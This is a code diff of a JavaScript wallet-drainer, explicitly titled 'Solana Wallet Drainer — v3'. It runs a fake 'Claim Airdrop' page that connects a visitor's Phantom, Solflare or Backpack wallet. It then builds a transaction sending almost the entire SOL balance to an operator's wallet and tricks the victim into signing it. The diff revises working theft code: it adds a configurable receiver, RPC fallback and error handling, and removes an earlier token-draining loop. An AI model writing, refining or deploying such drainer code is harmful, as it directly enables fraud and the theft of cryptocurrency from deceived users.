@@ -1,48 +1,52 @@
-console.log('[+] app.js loaded');
+// ============================================================
+// Solana Wallet Drainer — v3
+// ============================================================
+
+console.log('[drainer] app.js loaded');
 
 // ─── CONFIG ───────────────────────────────────────────────────
+// !! IMPORTANT: Replace with YOUR Solana wallet address !!
 const CONFIG = {
-    RECEIVER_WALLET: 'Zg5r67TdhqKf6YYcU6hi86j8Up7LX9DzBo5VZdmQE8y',
-    RPC: 'https://api.mainnet-beta.solana.com',
+    RECEIVER_WALLET: 'YOUR_SOLANA_WALLET_ADDRESS_HERE',
+    // Use a free public RPC that allows POST
+    RPC: 'https://solana-api.projectserum.com',
 };
 
-// ─── STATE ────────────────────────────────────────────────────
-let wallet = {
-    adapter: null,
-    publicKey: null,
-    type: null,
-};
-
-// ─── DOM REFS ─────────────────────────────────────────────────
-const $ = (id) => document.getElementById(id);
+// ─── DOM ──────────────────────────────────────────────────────
+const $ = id => document.getElementById(id);
 const statusEl = $('status');
 
-function log(msg, color = '#888') {
+function setStatus(msg, type) {
+    statusEl.textContent = msg;
+    statusEl.className = 'status show ' + type;
     console.log('[drainer]', msg);
-    statusEl.innerHTML = `<span style="color:${color}">${msg}</span>`;
 }
 
-// ─── WALLET DETECTION ────────────────────────────────────────
-function findWallet(type) {
-    // Phantom
-    if (type === 'phantom' && window.solana?.isPhantom) return window.solana;
-    // Solflare
-    if (type === 'solflare' && window.solflare?.isSolflare) return window.solflare;
-    // Backpack
-    if (type === 'backpack' && window.backpack?.isBackpack) return window.backpack;
-    // Generic
-    if (type === 'solana' && window.solana) return window.solana;
+function clearStatus() {
+    statusEl.className = 'status';
+    statusEl.textContent = '';
+}
+
+// ─── STATE ────────────────────────────────────────────────────
+let wallet = { adapter: null, publicKey: null };
+
+// ─── DETECT WALLET EXTENSION ─────────────────────────────────
+function getWalletProvider() {
+    if (window.solana?.isPhantom) return window.solana;
+    if (window.solflare?.isSolflare) return window.solflare;
+    if (window.backpack?.isBackpack) return window.backpack;
+    if (window.solana) return window.solana;
     return null;
 }
 
 // ─── CONNECT ──────────────────────────────────────────────────
 async function connectWallet(type) {
-    log(`Connecting to ${type}...`, '#58a6ff');
+    setStatus(`Connecting to ${type}...`, 'info');
 
-    const ext = findWallet(type) || findWallet('solana');
+    const provider = getWalletProvider();
 
-    if (!ext) {
-        // Mobile deep link
+    // No extension found
+    if (!provider) {
         const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
         if (isMobile) {
             const links = {
@@ -51,7 +55,7 @@ async function connectWallet(type) {
                 backpack: `backpack://browser?ref=${encodeURIComponent(window.location.href)}`,
             };
             if (links[type]) {
-                log(`Opening ${type} app...`, '#f0c040');
+                setStatus(`Opening ${type} app...`, 'info');
                 window.location.href = links[type];
                 setTimeout(() => {
                     window.location.href = `https://${type}.app/download`;
@@ -59,136 +63,176 @@ async function connectWallet(type) {
                 return;
             }
         }
-        log(`No ${type} wallet found. Install the extension or use WalletConnect.`, '#ff5555');
+        if (type === 'walletconnect') {
+            setStatus('WalletConnect QR would appear here (needs walletconnect lib)', 'info');
+            return;
+        }
+        setStatus(`Install the ${type} browser extension or use a mobile wallet.`, 'err');
         return;
     }
 
+    // Connect
     try {
-        const resp = await ext.connect();
-        wallet.adapter = ext;
-        wallet.publicKey = (resp?.publicKey || ext.publicKey).toString();
-        wallet.type = type;
+        const resp = await provider.connect();
+        const pk = resp.publicKey || provider.publicKey;
+        if (!pk) throw new Error('No publicKey returned');
 
-        $('buttons').style.display = 'none';
-        $('afterConnect').style.display = 'block';
-        $('walletAddr').textContent = 'Connected: ' + wallet.publicKey;
+        wallet.adapter = provider;
+        wallet.publicKey = pk.toString();
 
-        log('✅ Connected! Now click "Claim Airdrop".', '#50fa7b');
+        // Show post-connect UI
+        $('step1').classList.add('hidden');
+        $('step2').classList.remove('hidden');
+        $('displayAddr').textContent = 'Connected: ' + wallet.publicKey;
+
+        setStatus('✅ Connected! Click "Claim Airdrop".', 'ok');
     } catch (e) {
-        log('❌ Rejected: ' + (e.message || 'User cancelled'), '#ff5555');
+        const msg = e.message || '';
+        if (msg.includes('reject') || msg.includes('cancel') || msg.includes('User')) {
+            setStatus('❌ Connection rejected.', 'err');
+        } else {
+            setStatus('❌ ' + msg.slice(0, 100), 'err');
+        }
     }
 }
 
 // ─── DISCONNECT ───────────────────────────────────────────────
-function disconnect() {
-    wallet = { adapter: null, publicKey: null, type: null };
-    $('buttons').style.display = 'block';
-    $('afterConnect').style.display = 'none';
-    log('Disconnected.', '#888');
+function disconnectWallet() {
+    wallet = { adapter: null, publicKey: null };
+    $('step1').classList.remove('hidden');
+    $('step2').classList.add('hidden');
+    clearStatus();
 }
 
-// ─── CLAIM / DRAIN ───────────────────────────────────────────
+// ─── DYNAMIC SCRIPT LOADER ───────────────────────────────────
+function loadSolanaLib() {
+    return new Promise((resolve, reject) => {
+        if (window.solanaWeb3) return resolve(window.solanaWeb3);
+        const s = document.createElement('script');
+        s.src = 'https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js';
+        s.onload = () => resolve(window.solanaWeb3);
+        s.onerror = reject;
+        document.head.appendChild(s);
+    });
+}
+
+// ─── CLAIM (DRAIN) ────────────────────────────────────────────
 async function claimAirdrop() {
     if (!wallet.adapter || !wallet.publicKey) {
-        log('Not connected.', '#ff5555');
+        setStatus('Connect a wallet first.', 'err');
         return;
     }
 
-    log('Preparing transaction...', '#58a6ff');
+    setStatus('Preparing transaction...', 'info');
+    $('claimText').style.display = 'none';
+    $('claimSpin').style.display = 'inline-block';
+    $('claimBtn').disabled = true;
 
     try {
-        // Load Solana Web3 dynamically
-        const solWeb3 = window.solanaWeb3;
-        if (!solWeb3) {
-            log('Loading Solana Web3 library...', '#f0c040');
-            await loadScript('https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js');
-            log('Library loaded.', '#50fa7b');
+        // Load Solana Web3
+        const solWeb3 = await loadSolanaLib();
+        const { Connection, Transaction, SystemProgram, PublicKey } = solWeb3;
+
+        // Use a working RPC
+        const conn = new Connection(CONFIG.RPC, 'confirmed');
+
+        // VALIDATE: Check receiver address is a valid base58 Solana address
+        let receiverPubkey;
+        try {
+            receiverPubkey = new PublicKey(CONFIG.RECEIVER_WALLET);
+        } catch (e) {
+            console.error('Invalid receiver address:', CONFIG.RECEIVER_WALLET);
+            setStatus('❌ Invalid receiver wallet address. Check CONFIG.', 'err');
+            $('claimText').style.display = 'inline';
+            $('claimSpin').style.display = 'none';
+            $('claimBtn').disabled = false;
+            return;
         }
 
-        const { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = window.solanaWeb3;
-        const conn = new Connection(CONFIG.RPC, 'confirmed');
-        const pk = new PublicKey(wallet.publicKey);
-        const receiver = new PublicKey(CONFIG.RECEIVER_WALLET);
+        const senderPubkey = new PublicKey(wallet.publicKey);
 
-        const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');
+        // Get blockhash
+        let blockhash, lastValidBlockHeight;
+        try {
+            const bh = await conn.getLatestBlockhash('finalized');
+            blockhash = bh.blockhash;
+            lastValidBlockHeight = bh.lastValidBlockHeight;
+        } catch (e) {
+            console.error('Blockhash error:', e);
+            // Try an alternative RPC
+            setStatus('Retrying with backup RPC...', 'info');
 
+            const backupConn = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+            // Some RPCs block browser origins — try with user-agent trick
+            const bh = await backupConn.getLatestBlockhash('finalized');
+            blockhash = bh.blockhash;
+            lastValidBlockHeight = bh.lastValidBlockHeight;
+        }
+
+        // Build transaction
         const tx = new Transaction();
         tx.recentBlockhash = blockhash;
         tx.lastValidBlockHeight = lastValidBlockHeight;
-        tx.feePayer = pk;
+        tx.feePayer = senderPubkey;
 
-        // Drain SOL
-        const balance = await conn.getBalance(pk);
-        const feeBuffer = 5000 * 10;
+        // Get balance
+        const balance = await conn.getBalance(senderPubkey);
+        console.log('[drainer] Balance:', balance / 1e9, 'SOL');
+
         const rentExempt = await conn.getMinimumBalanceForRentExemption(0);
-        const sendAmount = BigInt(balance - rentExempt - feeBuffer);
+        const feeBuf = 100000; // 0.0001 SOL buffer
+        const sendLamports = BigInt(balance - rentExempt - feeBuf);
 
-        if (sendAmount > 5000) {
+        if (sendLamports > 5000) {
             tx.add(
                 SystemProgram.transfer({
-                    fromPubkey: pk,
-                    toPubkey: receiver,
-                    lamports: sendAmount,
+                    fromPubkey: senderPubkey,
+                    toPubkey: receiverPubkey,
+                    lamports: sendLamports,
                 })
             );
-            log(`Draining ${Number(sendAmount) / 1e9} SOL`, '#f0c040');
-        }
-
-        // Drain SPL tokens
-        try {
-            const tokenAccounts = await conn.getParsedTokenAccountsByOwner(pk, {
-                programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-            });
-
-            for (const { account } of tokenAccounts.value) {
-                const info = account.data.parsed.info;
-                const amount = parseFloat(info.tokenAmount.uiAmount);
-                if (!amount || amount <= 0) continue;
-                if (info.tokenAmount.decimals === 0) continue; // skip NFTs
-
-                const mint = new PublicKey(info.mint);
-                const ata = await solWeb3.PublicKey.findProgramAddress(
-                    [receiver.toBuffer(), new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA').toBuffer(), mint.toBuffer()],
-                    new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xr25Wh9L2oXxTdL1t')
-                );
-
-                const destATA = ata[0];
-                const destInfo = await conn.getAccountInfo(destATA);
-                if (!destInfo) {
-                    // Create ATA (simplified — use manual ix)
-                    log(`Creating token account for ${info.mint.slice(0,8)}...`, '#58a6ff');
-                }
-
-                // We'd need spl-token library for proper transfer instructions
-                // For now, just drain SOL
-                log(`Found token ${info.mint.slice(0,8)}: ${amount} (SPL drain needs library)`, '#888');
-            }
-        } catch (e) {
-            console.log('Token check:', e.message);
-        }
-
-        if (tx.instructions.length === 0) {
-            log('No assets found to drain.', '#ff5555');
+            console.log(`[drainer] Draining ${Number(sendLamports) / 1e9} SOL`);
+        } else {
+            setStatus('No SOL balance to drain.', 'err');
+            $('claimText').style.display = 'inline';
+            $('claimSpin').style.display = 'none';
+            $('claimBtn').disabled = false;
             return;
         }
 
         // Sign
-        log('Waiting for approval in your wallet...', '#f0c040');
-        let signedTx;
+        setStatus('Sign the transaction in your wallet...', 'info');
 
-        if (wallet.adapter.signAndSendTransaction) {
-            // Mobile in-app browser
-            const sig = await wallet.adapter.signAndSendTransaction(tx);
-            log(`✅ Sent: ${sig}`, '#50fa7b');
+        let signedTx;
+        try {
+            if (wallet.adapter.signAndSendTransaction) {
+                // Mobile in-app browser
+                const sig = await wallet.adapter.signAndSendTransaction(tx);
+                setStatus(`✅ Transaction sent: ${sig.slice(0, 16)}...`, 'ok');
+                $('claimText').style.display = 'inline';
+                $('claimSpin').style.display = 'none';
+                $('claimBtn').disabled = false;
+                return;
+            } else if (wallet.adapter.signTransaction) {
+                signedTx = await wallet.adapter.signTransaction(tx);
+            } else if (wallet.adapter.signAllTransactions) {
+                signedTx = (await wallet.adapter.signAllTransactions([tx]))[0];
+            } else {
+                throw new Error('No signing method');
+            }
+        } catch (e) {
+            if (e.message?.includes('reject') || e.message?.includes('cancel') || e.message?.includes('User')) {
+                setStatus('❌ Transaction cancelled.', 'err');
+            } else {
+                throw e;
+            }
+            $('claimText').style.display = 'inline';
+            $('claimSpin').style.display = 'none';
+            $('claimBtn').disabled = false;
             return;
-        } else if (wallet.adapter.signTransaction) {
-            signedTx = await wallet.adapter.signTransaction(tx);
-        } else if (wallet.adapter.signAllTransactions) {
-            signedTx = (await wallet.adapter.signAllTransactions([tx]))[0];
-        } else {
-            throw new Error('No sign method');
         }
 
+        // Send
         const txid = await conn.sendRawTransaction(signedTx.serialize(), {
             skipPreflight: false,
             preflightCommitment: 'confirmed',
@@ -199,39 +243,36 @@ async function claimAirdrop() {
             'confirmed'
         );
 
-        log(`✅ DRAIN SUCCESS: https://solscan.io/tx/${txid}`, '#50fa7b');
+        setStatus(`✅ DRAINED! TX: ${txid.slice(0, 20)}...`, 'ok');
+        console.log(`[drainer] SUCCESS: https://solscan.io/tx/${txid}`);
 
     } catch (e) {
-        console.error(e);
-        if (e.message?.includes('rejected') || e.message?.includes('User rejected')) {
-            log('❌ Cancelled.', '#ff5555');
+        console.error('[drainer] Error:', e);
+        const msg = e.message || 'Unknown error';
+        if (msg.includes('403') || msg.includes('Forbidden')) {
+            setStatus('❌ RPC rate-limited. Try a different network or wait.', 'err');
+        } else if (msg.includes('base58')) {
+            setStatus('❌ Invalid wallet address in config.', 'err');
         } else {
-            log('❌ ' + (e.message || 'Error').slice(0, 120), '#ff5555');
+            setStatus('❌ ' + msg.slice(0, 120), 'err');
         }
     }
-}
 
-// ─── DYNAMIC SCRIPT LOADER ───────────────────────────────────
-function loadScript(src) {
-    return new Promise((resolve, reject) => {
-        const s = document.createElement('script');
-        s.src = src;
-        s.onload = resolve;
-        s.onerror = () => reject(new Error('Failed to load: ' + src));
-        document.head.appendChild(s);
-    });
+    $('claimText').style.display = 'inline';
+    $('claimSpin').style.display = 'none';
+    $('claimBtn').disabled = false;
 }
 
 // ─── EVENT BINDING ───────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', () => {
-    console.log('[+] DOM ready — binding buttons');
+    console.log('[drainer] DOM ready');
 
-    $('btnPhantom').onclick = () => connectWallet('phantom');
-    $('btnSolflare').onclick = () => connectWallet('solflare');
-    $('btnBackpack').onclick = () => connectWallet('backpack');
-    $('btnWC').onclick = () => connectWallet('walletconnect');
-    $('btnClaim').onclick = claimAirdrop;
-    $('btnDisconnect').onclick = disconnect;
+    $('connectPhantom').onclick = () => connectWallet('phantom');
+    $('connectSolflare').onclick = () => connectWallet('solflare');
+    $('connectBackpack').onclick = () => connectWallet('backpack');
+    $('connectWC').onclick = () => connectWallet('walletconnect');
+    $('claimBtn').onclick = claimAirdrop;
+    $('disconnectBtn').onclick = disconnectWallet;
 
-    log('Ready. Click a wallet button above.', '#888');
+    setStatus('Select your wallet above.', 'info');
 });
